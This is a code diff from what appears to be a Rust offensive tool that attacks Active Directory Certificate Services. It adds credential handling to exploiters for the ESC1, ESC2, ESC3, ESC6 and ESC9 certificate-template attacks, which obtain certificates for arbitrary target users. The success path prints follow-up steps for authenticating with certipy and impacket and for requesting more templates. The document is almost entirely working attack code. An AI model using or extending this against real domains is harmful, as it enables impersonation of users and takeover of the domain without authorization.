@@ -304,32 +304,39 @@ async fn execute_auto(
     let use_ssl = config.ca_use_ssl();
     // Try ESC1 first (most reliable SAN-based attack)
     match Esc1Exploiter::with_ssl(&ca_server, use_ssl) {
-        Ok(exploiter) => match exploiter.exploit(template, upn, None).await {
-            Ok(cert) => {
-                info!("ESC1 attack succeeded!");
-                return Ok(AdcsResult {
-                    action: "Auto (ESC1)".to_string(),
-                    ca_server: ca_server.clone(),
-                    success: true,
-                    certificate_pfx: Some(cert.pfx_data.clone()),
-                    certificate_thumbprint: Some(cert.thumbprint.clone()),
-                    message: format!(
-                        "ESC1 succeeded: obtained certificate for {} via template {}",
-                        upn, template
-                    ),
-                    next_steps: vec![
-                        "Convert PFX to .ccache for use with impacket tools".to_string(),
-                        "Use certipy auth -pfx <file> -dc-ip <dc> to authenticate".to_string(),
-                        "Consider requesting additional templates with this certificate"
-                            .to_string(),
-                    ],
-                });
+        Ok(exploiter) => {
+            let exploiter = if let Some(p) = &config.password {
+                exploiter.with_credentials(&config.domain, &config.username, p)
+            } else {
+                exploiter
+            };
+            match exploiter.exploit(template, upn, None).await {
+                Ok(cert) => {
+                    info!("ESC1 attack succeeded!");
+                    return Ok(AdcsResult {
+                        action: "Auto (ESC1)".to_string(),
+                        ca_server: ca_server.clone(),
+                        success: true,
+                        certificate_pfx: Some(cert.pfx_data.clone()),
+                        certificate_thumbprint: Some(cert.thumbprint.clone()),
+                        message: format!(
+                            "ESC1 succeeded: obtained certificate for {} via template {}",
+                            upn, template
+                        ),
+                        next_steps: vec![
+                            "Convert PFX to .ccache for use with impacket tools".to_string(),
+                            "Use certipy auth -pfx <file> -dc-ip <dc> to authenticate".to_string(),
+                            "Consider requesting additional templates with this certificate"
+                                .to_string(),
+                        ],
+                    });
+                }
+                Err(e) => {
+                    warn!("ESC1 failed: {}", e);
+                    next_steps.push(format!("ESC1 failed: {}", e));
+                }
             }
-            Err(e) => {
-                warn!("ESC1 failed: {}", e);
-                next_steps.push(format!("ESC1 failed: {}", e));
-            }
-        },
+        }
         Err(e) => {
             warn!("ESC1 exploiter creation failed: {}", e);
             next_steps.push(format!("ESC1 setup failed: {}", e));
@@ -410,6 +417,11 @@ async fn execute_esc1(config: &AdcsConfig, template: &str, target_upn: &str) -> 
     let ca_server = config.ca_server()?;
     let use_ssl = config.ca_use_ssl();
     let exploiter = Esc1Exploiter::with_ssl(&ca_server, use_ssl)?;
+    let exploiter = if let Some(p) = &config.password {
+        exploiter.with_credentials(&config.domain, &config.username, p)
+    } else {
+        exploiter
+    };
 
     let cert = exploiter.exploit(template, target_upn, None).await?;
 
@@ -434,6 +446,11 @@ async fn execute_esc2(config: &AdcsConfig, template: &str, target_upn: &str) -> 
     let ca_server = config.ca_server()?;
     let use_ssl = config.ca_use_ssl();
     let exploiter = Esc2Exploiter::with_ssl(&ca_server, use_ssl)?;
+    let exploiter = if let Some(p) = &config.password {
+        exploiter.with_credentials(&config.domain, &config.username, p)
+    } else {
+        exploiter
+    };
 
     let cert = exploiter.exploit(template, target_upn, None).await?;
 
@@ -458,6 +475,11 @@ async fn execute_esc3(config: &AdcsConfig, template: &str, target_upn: &str) -> 
     let ca_server = config.ca_server()?;
     let use_ssl = config.ca_use_ssl();
     let exploiter = Esc3Exploiter::with_ssl(&ca_server, use_ssl)?;
+    let exploiter = if let Some(p) = &config.password {
+        exploiter.with_credentials(&config.domain, &config.username, p)
+    } else {
+        exploiter
+    };
 
     // ESC3 exploit takes 3 args: agent_template, target_template, target_user
     let (_agent_cert, user_cert) = exploiter.exploit(template, template, target_upn).await?;
@@ -588,6 +610,11 @@ async fn execute_esc6(config: &AdcsConfig, template: &str, target_upn: &str) -> 
     let ca_server = config.ca_server()?;
     let use_ssl = config.ca_use_ssl();
     let exploiter = Esc6Exploiter::with_ssl(&ca_server, use_ssl)?;
+    let exploiter = if let Some(p) = &config.password {
+        exploiter.with_credentials(&config.domain, &config.username, p)
+    } else {
+        exploiter
+    };
 
     let cert = exploiter.exploit(template, target_upn).await?;
 
@@ -895,6 +922,11 @@ async fn execute_esc9(config: &AdcsConfig, template: &str, target_upn: &str) -> 
     let ca_server = config.ca_server()?;
     let use_ssl = config.ca_use_ssl();
     let exploiter = Esc9Exploiter::with_ssl(&ca_server, use_ssl)?;
+    let exploiter = if let Some(p) = &config.password {
+        exploiter.with_credentials(&config.domain, &config.username, p)
+    } else {
+        exploiter
+    };
 
     // ESC9 requires Esc9Config struct with victim info for UPN poisoning
     let esc9_config = Esc9Config {
